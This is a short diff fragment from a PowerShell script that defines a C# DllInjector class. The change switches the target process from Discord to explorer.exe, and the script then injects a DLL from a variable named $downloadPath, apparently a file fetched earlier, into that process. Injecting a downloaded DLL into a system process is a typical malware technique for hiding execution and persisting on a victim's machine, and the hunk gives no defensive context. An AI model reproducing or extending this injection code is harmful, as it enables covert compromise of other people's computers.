@@ -59,7 +59,7 @@ public class DllInjector
 "@
 
 # Find explorer.exe process ID (assuming one instance; in reality, there might be multiple)
-$explorerProc = Get-Process -Name discord | Select-Object -First 1 -ExpandProperty Id
+$explorerProc = Get-Process -Name explorer | Select-Object -First 1 -ExpandProperty Id
 
 # Inject the DLL into explorer.exe
 $result = [DllInjector]::InjectDll($explorerProc, $downloadPath)
